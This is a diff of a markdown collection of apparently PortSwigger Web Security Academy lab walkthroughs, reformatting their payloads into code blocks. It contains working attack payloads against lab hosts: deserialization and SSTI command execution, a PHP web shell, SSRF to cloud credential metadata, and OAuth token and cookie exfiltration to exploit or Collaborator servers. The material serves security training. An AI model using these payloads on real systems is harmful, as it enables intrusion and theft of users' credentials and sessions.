-/home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}`
+   ```
+   O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm
+   /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
+   ```
 
 ### Lab: Using PHAR deserialization to deploy a custom gadget chain
 
@@ -6606,22 +6915,26 @@ You can log in to your own account using the following credentials:
 4. Notice that the `file_exists()` filesystem method is called on the `lockFilePath` attribute.
 5. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file:
 
-`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm
-/home/carlos/morale.txt")}}`
+   ```
+   {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm
+   /home/carlos/morale.txt")}}
+   ```
 
 6. Write a some PHP for creating a `CustomTemplate` and `Blog` containing your SSTI payload:
 
-`class CustomTemplate {} class Blog {} $object = new CustomTemplate; $blog =
-new Blog; $blog->desc =
-'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm
-/home/carlos/morale.txt")}}'; $blog->user = 'user';
-$object->template_file_path = $blog;`
+   ```js
+   class CustomTemplate {} class Blog {} $object = new CustomTemplate; $blog =
+   new Blog; $blog->desc =
+   '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm
+   /home/carlos/morale.txt")}}'; $blog->user = 'user';
+   $object->template_file_path = $blog;
+   ```
 
 7. Create a `PHAR-JPG` polyglot containing your PHP script. You can find several scripts for doing this online (search for "`phar jpg polyglot`"). Alternatively, you can download our [ ready-made one](https://github.com/PortSwigger/serialization-examples/blob/master/php/phar-jpg-polyglot.jpg).
 8. Upload this file as your avatar.
 9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a `phar://` stream as follows:
 
-`GET /cgi-bin/avatar.php?avatar=phar://wiener`
+   `GET /cgi-bin/avatar.php?avatar=phar://wiener`
 
 10. Send the request to solve the lab.
 
@@ -7138,8 +7451,10 @@ To solve the lab, poison the cache so the home page executes
 7. Go to the exploit server and create a file at `/resources/js/tracking.js` containing the payload `alert(document.cookie)`. Store the exploit and copy the domain name for your exploit server.
 8. Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:
 
-`GET /?cb=123 HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Host: YOUR-
-EXPLOIT-SERVER-ID.exploit-server.net`
+   ```http
+   GET /?cb=123 HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Host: YOUR-
+   EXPLOIT-SERVER-ID.exploit-server.net
+   ```
 
 9. Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the `alert()` fires.
 10. In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.
@@ -7181,7 +7496,9 @@ To solve the lab, you must use Burp Collaborator's default public server.
 12. Study the form for deleting users. Notice that it will generate a `POST` request to `/admin/delete` with both a CSRF token and `username` parameter. You need to manually craft an equivalent request to delete `carlos`.
 13. Change the path in your request to `/admin/delete`. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a `username` parameter containing `carlos`. The request line should now look like this but with a different CSRF token:
 
-`GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
+   ```http
+   GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
+   ```
 
 14. Copy the session cookie from the `Set-Cookie` header in the displayed response and add it to your request.
 15. Right-click on your request and select **Change request method**. Burp will convert it to a `POST` request.
@@ -7210,8 +7527,10 @@ To solve the lab, you must use Burp Collaborator's default public server.
 3. Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.
 4. Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:
 
-`GET https://YOUR-LAB-ID.web-security-academy.net/ Host: BURP-COLLABORATOR-
-SUBDOMAIN`
+   ```http
+   GET https://YOUR-LAB-ID.web-security-academy.net/ Host: BURP-COLLABORATOR-
+   SUBDOMAIN
+   ```
 
 5. Right-click and select **Insert Collaborator payload** to insert a Burp Collaborator subdomain where indicated in the request.
 6. Send the request containing the absolute URL to Burp Intruder.
@@ -7220,8 +7539,10 @@ SUBDOMAIN`
 9. In Burp Repeater, append `/admin` to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users.
 10. Change the absolute URL in your request to point to `/admin/delete`. Copy the CSRF token from the displayed response and add it as a query parameter to your request. Also add a `username` parameter containing `carlos`. The request line should now look like this but with a different CSRF token:
 
-`GET https://YOUR-LAB-ID.web-security-
-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
+   ```http
+   GET https://YOUR-LAB-ID.web-security-
+   academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
+   ```
 
 11. Copy the session cookie from the `Set-Cookie` header in the displayed response and add it to your request.
 12. Right-click on your request and select "Change request method". Burp will convert it to a `POST` request.
@@ -7369,8 +7690,10 @@ To solve the lab, you must use Burp Collaborator's default public server.
 1. While proxying traffic through Burp, log in to your own account. Browse to `https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration` to access the configuration file. Notice that the client registration endpoint is located at `/reg`.
 2. In Burp Repeater, create a suitable `POST` request to register your own client application with the OAuth service. You must at least provide a `redirect_uris` array containing an arbitrary whitelist of callback URIs for your fake application. For example:
 
-`POST /reg HTTP/1.1 Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net Content-
-Type: application/json { "redirect_uris" : [ "https://example.com" ] }`
+   ```http
+   POST /reg HTTP/1.1 Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net Content-
+   Type: application/json { "redirect_uris" : [ "https://example.com" ] }
+   ```
 
 3. Send the request. Observe that you have now successfully registered your own client application without requiring any authentication. The response contains various metadata associated with your new client application, including a new `client_id`.
 4. Using Burp, audit the OAuth flow and notice that the "Authorize" page, where the user consents to the requested permissions, displays the client application's logo. This is fetched from `/client/CLIENT-ID/logo`. We know from the OpenID specification that client applications can provide the URL for their logo using the `logo_uri` property during dynamic registration. Send the `GET /client/CLIENT-ID/logo` request to Burp Repeater.
@@ -7385,8 +7708,10 @@ Type: application/json { "redirect_uris" : [ "https://example.com" ],
 8. Go to the Collaborator tab dialog and check for any new interactions. Notice that there is an HTTP interaction attempting to fetch your non-existent logo. This confirms that you can successfully use the `logo_uri` property to elicit requests from the OAuth server.
 9. Go back to the `POST /reg` request in Repeater and replace the current `logo_uri` value with the target URL:
 
-`"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-
-credentials/admin/"`
+   ```
+   "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-
+   credentials/admin/"
+   ```
 
 10. Send this request and copy the new `client_id` from the response.
 11. Go back to the `GET /client/CLIENT-ID/logo` request and replace the `client_id` with the new one you just copied. Send this request. Observe that the response contains the sensitive metadata for the OAuth provider's cloud environment, including the secret access key.
@@ -7425,8 +7750,10 @@ You can log in to your own accounts using the following credentials:
 9. Turn off proxy interception and log out of the blog website.
 10. Go to the exploit server and create an `iframe` in which the `src` attribute points to the URL you just copied. The result should look something like this:
 
-`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-
-linking?code=STOLEN-CODE"></iframe>`
+   ```html
+   <iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-
+   linking?code=STOLEN-CODE"></iframe>
+   ```
 
 11. Deliver the exploit to the victim. When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the admin account on the blog website.
 12. Go back to the blog website and select the "Log in with social media" option again. Observe that you are instantly logged in as the admin user. Go to the admin panel and delete `carlos` to solve the lab.
@@ -7456,16 +7783,18 @@ credentials: `wiener:peter`.
 5. Change the `redirect_uri` to point to the exploit server, then send the request and follow the redirect. Go to the exploit server's access log and observe that there is a log entry containing an authorization code. This confirms that you can leak authorization codes to an external domain.
 6. Go back to the exploit server and create the following `iframe` at `/exploit`:
 
-`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-
-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-
-EXPLOIT-SERVER-ID.exploit-
-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
+   ```html
+   <iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-
+   server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-
+   EXPLOIT-SERVER-ID.exploit-
+   server.net&response_type=code&scope=openid%20profile%20email"></iframe>
+   ```
 
 7. Store the exploit and click "View exploit". Check that your `iframe` loads and then check the exploit server's access log. If everything is working correctly, you should see another request with a leaked code.
 8. Deliver the exploit to the victim, then go back to the access log and copy the victim's code from the resulting request.
 9. Log out of the blog website and then use the stolen code to navigate to:
 
-`https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
+   `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE`
 
 The rest of the OAuth flow will be completed automatically and you will be
 logged in as the admin user. Open the admin panel and delete `carlos` to solve
@@ -7502,7 +7831,7 @@ credentials: `wiener:peter`.
 6. In the browser, log in again and go to the intercepted `GET /auth?client_id=[...]` request in Burp Proxy.
 7. Confirm that the `redirect_uri` parameter is in fact vulnerable to directory traversal by changing it to:
 
-`https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
+   `https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1`
 
 Forward any remaining requests and observe that you are eventually redirected
 to the first blog post. In the browser, notice that your access token is
@@ -7512,25 +7841,31 @@ included in the URL as a fragment.
 9. In Repeater, experiment with the `path` parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
 10. Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the `redirect_uri` pointing to the open redirect, which subsequently forwards the victim to your exploit server:
 
-`https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-
-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-
-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-
-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email`
+   ```html
+   https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-
+   CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-
+   callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-
+   server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
+   ```
 
 11. Test that this URL works correctly by visiting it in the browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
 12. On the exploit server, create a suitable script at `/exploit` that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:
 
-`<script> window.location = '/?'+document.location.hash.substr(1) </script>`
+   ```html
+   <script> window.location = '/?'+document.location.hash.substr(1) </script>
+   ```
 
 13. To test that everything is working correctly, store this exploit and visit your malicious URL again in the browser. Then, go to the exploit server access log. There should be a request for `GET /?access_token=[...]`.
 14. You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:
 
-`<script> if (!document.location.hash) { window.location = 'https://oauth-
-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-
-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-
-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-
-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
-} else { window.location = '/?'+document.location.hash.substr(1) } </script>`
+   ```html
+   <script> if (!document.location.hash) { window.location = 'https://oauth-
+   YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-
+   ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-
+   callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-
+   server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+   } else { window.location = '/?'+document.location.hash.substr(1) } </script>
+   ```
 
 15. To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for `GET /?access_token=[...]`.
 16. Deliver the exploit to the victim, then copy their access token from the log.
@@ -7565,15 +7900,18 @@ Chromium browser) to test your exploit.
 2. Using Burp, audit the other pages on the blog website. Observe that the comment form is included as an `iframe` on each blog post. Look closer at the `/post/comment/comment-form` page in Burp and notice that it uses the `postMessage()` method to send the `window.location.href` property to its parent window. Crucially, it allows messages to be posted to any origin (`*`).
 3. From the proxy history, right-click on the `GET /auth?client_id=[...]` request and select "Copy URL". Go to the exploit server and create an `iframe` in which the `src` attribute is the URL you just copied. Use directory traversal to change the `redirect_uri` so that it points to the comment form. The result should look something like this:
 
-`<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-
-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-
-ID.web-security-academy.net/oauth-callback/../post/comment/comment-
-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>`
+   ```html
+   <iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-
+   server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-
+   ID.web-security-academy.net/oauth-callback/../post/comment/comment-
+   form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
+   ```
 
 4. Below this, add a suitable script that will listen for web messages and output the contents somewhere. For example, you can use the following script to reveal the web message in the exploit server's access log:
 
-`<script> window.addEventListener('message', function(e) { fetch("/" +
-encodeURIComponent(e.data.data)) }, false) </script>`
+   ```html
+   <script> window.addEventListener('message', function(e) { fetch("/" + encodeURIComponent(e.data.data)) }, false) </script>
+   ```
 
 5. To check the exploit is working, store it and then click "View exploit". Make sure that the `iframe` loads then go to the exploit server's access log. There should be a request for which the path is the full URL of the comment form, along with a fragment containing the access token.
 6. Go back to the exploit server and deliver this exploit to the victim. Copy their access token from the log. Make sure you don't accidentally include any of the surrounding URL-encoded characters.
@@ -7603,12 +7941,14 @@ You can log in to your own account using the following credentials:
 4. In the proxy history, notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
 5. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret file. For example:
 
-`<?php echo file_get_contents('/home/carlos/secret'); ?>`
+   ```php
+   <?php echo file_get_contents('/home/carlos/secret'); ?>
+   ```
 
 6. Use the avatar upload function to upload your malicious PHP file. The message in the response confirms that this was uploaded successfully.
 7. In Burp Repeater, change the path of the request to point to your PHP file:
 
-`GET /files/avatars/exploit.php HTTP/1.1`
+   `GET /files/avatars/exploit.php HTTP/1.1`
 
 8. Send the request. Notice that the server has executed your script and returned its output (Carlos's secret) in the response.
 9. Submit the secret to solve the lab.
@@ -7634,7 +7974,7 @@ You can log in to your own account using the following credentials:
 2. In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
 3. On your system, create a file called `exploit.php`, containing a script for fetching the contents of Carlos's secret. For example:
 
-`<?php echo file_get_contents('/home/carlos/secret'); ?>`
+   `<?php echo file_get_contents('/home/carlos/secret'); ?>`
 
 4. Attempt to upload this script as your avatar. The response indicates that you are only allowed to upload files with the MIME type `image/jpeg` or `image/png`.
 5. In Burp, go back to the proxy history and find the `POST /my-account/avatar` request that was used to submit the file upload. Send this to Burp Repeater.
@@ -7815,7 +8155,7 @@ You can log in to your own account using the following credentials:
 
 The vulnerable code that introduces this race condition is as follows:
 
-```
+```php
 <?php $target_dir = "avatars/"; $target_file = $target_dir .
 $_FILES["avatar"]["name"]; // temporary move
 move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file); if
@@ -7855,17 +8195,17 @@ few milliseconds.
 6. Right-click on the `POST /my-account/avatar` request that was used to submit the file upload and select **Extensions > Turbo Intruder > Send to turbo intruder**. The Turbo Intruder window opens.
 7. Copy and paste the following script template into Turbo Intruder's Python editor:
 
-```python
-def queueRequests(target, wordlists): engine =
-RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) request1 =
-#'''<YOUR-POST-REQUEST>''' request2 = '''<YOUR-GET-REQUEST>''' # the 'gate'
-argument blocks the final byte of each request until openGate is invoked
-engine.queue(request1, gate='race1') for x in range(5): engine.queue(request2,
-#gate='race1') # wait until every 'race1' tagged request is ready # then send
-#the final byte of each request # (this method is non-blocking, just like
-queue) engine.openGate('race1') engine.complete(timeout=60) def
-handleResponse(req, interesting): table.add(req)
-```
+   ```python
+   def queueRequests(target, wordlists): engine =
+   RequestEngine(endpoint=target.endpoint, concurrentConnections=10,) request1 =
+   #'''<YOUR-POST-REQUEST>''' request2 = '''<YOUR-GET-REQUEST>''' # the 'gate'
+   argument blocks the final byte of each request until openGate is invoked
+   engine.queue(request1, gate='race1') for x in range(5): engine.queue(request2,
+   #gate='race1') # wait until every 'race1' tagged request is ready # then send
+   #the final byte of each request # (this method is non-blocking, just like
+   queue) engine.openGate('race1') engine.complete(timeout=60) def
+   handleResponse(req, interesting): table.add(req)
+   ```
 
 8. In the script, replace `<YOUR-POST-REQUEST>` with the entire `POST /my-account/avatar` request containing your `exploit.php` file. You can copy and paste this from the top of the Turbo Intruder window.
 9. Replace `<YOUR-GET-REQUEST>` with a `GET` request for fetching your uploaded PHP file. The simplest way to do this is to copy the `GET /files/avatars/<YOUR-IMAGE>` request from your proxy history, then change the filename in the path to `exploit.php`.
@@ -8127,10 +8467,12 @@ management/jwts) before attempting this lab.
 
 10. Paste the JWK into the `keys` array on the exploit server, then store the exploit. The result should look something like this:
 
-`{ "keys": [ { "kty": "RSA", "e": "AQAB", "kid":
-"893d8f0b-061f-42c2-a4aa-5056e12b8ae7", "n":
-"yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
-} ] }`
+   ```json
+   { "keys": [ { "kty": "RSA", "e": "AQAB", "kid":
+   "893d8f0b-061f-42c2-a4aa-5056e12b8ae7", "n":
+   "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
+   } ] }
+   ```
 
 ###### Part 2 - Modify and sign the JWT
 
@@ -8202,7 +8544,7 @@ predictable contents.
 
 2. In the header of the JWT, change the value of the `kid` parameter to a path traversal sequence pointing to the `/dev/null` file:
 
-`../../../../../../../dev/null`
+   `../../../../../../../dev/null`
 
 3. In the JWT payload, change the value of the `sub` claim to `administrator`.
 
@@ -8459,7 +8801,11 @@ Burp polls the Burp Collaborator server for new interactions every minute.
 3. Send the request to Burp Repeater.
 4. Go to the **Collaborator** tab and click **Copy to clipboard**. A new Burp Collaborator payload is saved to your clipboard.
 5. Go to the **Repeater** tab and use the Inspector to view the cookie in its decoded form.
-6. Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner used with an exploit that exfiltrates the victim's cookies. For example: `'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID`
+6. Using the Collaborator payload you just copied, replace the proof-of-concept that Burp Scanner used with an exploit that exfiltrates the victim's cookies. For example: 
+
+```sql
+'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
+```
 
 Note that you need to preserve the second part of the cookie containing your
 session ID.
@@ -8764,9 +9110,11 @@ To solve the lab:
 
 8. Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains following the sanitization process. For example:
 
-`/?__pro__proto__to__[foo]=bar /?__pro__proto__to__.foo=bar
-/?constconstructorructor[protoprototypetype][foo]=bar
-/?constconstructorructor.protoprototypetype.foo=bar`
+   ```
+   /?__pro__proto__to__[foo]=bar /?__pro__proto__to__.foo=bar
+   /?constconstructorructor[protoprototypetype][foo]=bar
+   /?constconstructorructor.protoprototypetype.foo=bar
+   ```
 
 9. In the console, enter `Object.prototype` again. Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source and bypassed the website's key sanitization.
 
@@ -8780,13 +9128,13 @@ To solve the lab:
 
 1. Using the prototype pollution source you identified earlier, try injecting an arbitrary `transport_url` property:
 
-`/?__pro__proto__to__[transport_url]=foo`
+   `/?__pro__proto__to__[transport_url]=foo`
 
-2. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the `src` attribute `foo`.
+2. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page. Observe that a `<script>` element has been rendered on the page, with the `src` attribute `foo`.
 
 3. Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a `data:` URL as follows:
 
-`/?__pro__proto__to__[transport_url]=data:,alert(1);`
+   `/?__pro__proto__to__[transport_url]=data:,alert(1);`
 
 4. Observe that the `alert(1)` is called and the lab is solved.
 
@@ -8807,8 +9155,7 @@ To solve the lab:
 
 This lab is based on real-world vulnerabilities discovered by PortSwigger
 Research. For more details, check out [Widespread prototype pollution
-gadgets](https://portswigger.net/research/widespread-prototype-pollution-
-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).
+gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).
 
 ##### Solution
 
@@ -8834,8 +9181,10 @@ gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).
 
 11. In the **Body** section, craft an exploit that will navigate the victim to a malicious URL as follows:
 
-`<script> location="https://YOUR-LAB-ID.web-security-
-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29" </script>`
+   ```html
+   <script> location="https://YOUR-LAB-ID.web-security-
+   academy.net/#__proto__[hitCallback]=alert%28document.cookie%29" </script>
+   ```
 
 12. Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the `alert(document.cookie)` payload is triggered.
 
@@ -8884,7 +9233,7 @@ when testing real websites, so you should always use caution.
 
 1. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with an arbitrary property:
 
-`"__proto__": { "foo":"bar" }`
+   `"__proto__": { "foo":"bar" }`
 
 2. Send the request.
 
@@ -9233,32 +9582,32 @@ ID.oastify.com\n" }`
 - Use burpsuite extension prebuilt(right clk on req. and clk GraphQL > Set introspection query or use InQL
 - Manually fetching GraphQL:
 
-```http
-POST /graphql HTTP/1.1
-Host: target.com
+   ```http
+   POST /graphql HTTP/1.1
+   Host: target.com
 
-{"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
+   {"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
 
-```
+   ```
 
 -  users
 
-```http
-POST /users HTTP/1.1
-Host: target.com
+   ```http
+   POST /users HTTP/1.1
+   Host: target.com
 
-{"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
+   {"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
 
-```
-- specific-dir
+   ```
+   - specific-dir
 
-```http
-POST /specific-dir HTTP/1.1
-Host: target.com
+   ```http
+   POST /specific-dir HTTP/1.1
+   Host: target.com
 
-{"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
+   {"query": "{ __schema { types { name kind fields { name type { name kind } } } } }"}
 
-```
+   ```
 
 ### Lab: Accessing private GraphQL posts
 
@@ -9375,7 +9724,9 @@ For example: `/api?query=query{__typename}`.
 To do this, right-click the request and select **GraphQL > Set introspection
 query**:
 
-`/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A`
+   ```
+   /api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+   ```
 
 2. Notice from the response that introspection is disallowed.
 
@@ -9383,7 +9734,9 @@ query**:
 
 For example:
 
-`/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possible